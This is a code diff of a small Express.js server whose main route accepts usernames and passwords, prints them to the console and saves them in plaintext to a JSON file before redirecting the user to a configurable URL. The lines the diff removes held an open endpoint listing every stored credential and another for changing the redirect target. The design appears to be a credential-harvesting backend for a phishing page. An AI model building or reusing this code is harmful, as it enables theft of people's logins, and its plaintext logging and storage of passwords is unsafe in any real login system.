@@ -8,34 +8,25 @@ const app = express();
 const PORT = 3000;
 
 // Middleware
-app.use(cors());
+app.use(cors()); // Allow all origins for simplicity
 app.use(bodyParser.json());
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static(path.join(__dirname, 'public'))); // Serve frontend files
 
-// Ensure necessary files exist
-if (!fs.existsSync('submissions.json')) fs.writeFileSync('submissions.json', JSON.stringify([]));
-if (!fs.existsSync('config.json')) fs.writeFileSync('config.json', JSON.stringify({ redirectUrl: '/thankyou.html' }));
-
-// Serve the form and admin pages
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-app.get('/admin.html', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
-});
-
-// Handle form submission
+// API route to handle form submissions
 app.post('/api/submit', (req, res) => {
   const { username, password } = req.body;
 
   if (username && password) {
-    const submissions = JSON.parse(fs.readFileSync('submissions.json', 'utf8'));
+    console.log('Data received:', { username, password });
+
+    // Simulate saving data to a file (replace with database in production)
+    const submissions = JSON.parse(fs.readFileSync('submissions.json', 'utf8') || '[]');
     submissions.push({ username, password, timestamp: new Date().toISOString() });
     fs.writeFileSync('submissions.json', JSON.stringify(submissions, null, 2));
 
-    const config = JSON.parse(fs.readFileSync('config.json', 'utf8'));
-    res.json({ message: 'Submission successful', redirectUrl: config.redirectUrl });
+    // Read the redirect URL from config.json
+    const config = JSON.parse(fs.readFileSync('config.json', 'utf8') || '{}');
+    res.json({ message: 'Submission successful', redirectUrl: config.redirectUrl || '/thankyou.html' });
   } else {
     res.status(400).json({ message: 'Invalid input' });
   }
@@ -44,35 +35,4 @@ app.post('/api/submit', (req, res) => {
 // Start the server
 app.listen(PORT, () => {
   console.log(`Server running at http://localhost:${PORT}`);
-});
-app.post('/api/submit', (req, res) => {
-  console.log('Received data:', req.body);
-
-  const { username, password } = req.body;
-  if (username && password) {
-    const submissions = JSON.parse(fs.readFileSync('submissions.json', 'utf8'));
-    submissions.push({ username, password, timestamp: new Date().toISOString() });
-    fs.writeFileSync('submissions.json', JSON.stringify(submissions, null, 2));
-    console.log('Saved submission:', { username, password });
-
-    const config = JSON.parse(fs.readFileSync('config.json', 'utf8'));
-    res.json({ message: 'Submission successful', redirectUrl: config.redirectUrl });
-  } else {
-    res.status(400).json({ message: 'Invalid input' });
-  }
-});
-app.get('/api/submissions', (req, res) => {
-  const submissions = JSON.parse(fs.readFileSync('submissions.json', 'utf8'));
-  res.json(submissions);
-});
-app.post('/api/config/redirect', (req, res) => {
-  const { redirectUrl } = req.body;
-
-  if (redirectUrl) {
-    // Save the new redirect URL to config.json
-    fs.writeFileSync('config.json', JSON.stringify({ redirectUrl }));
-    res.json({ message: 'Redirect URL updated successfully' });
-  } else {
-    res.status(400).json({ message: 'Invalid URL' });
-  }
 });
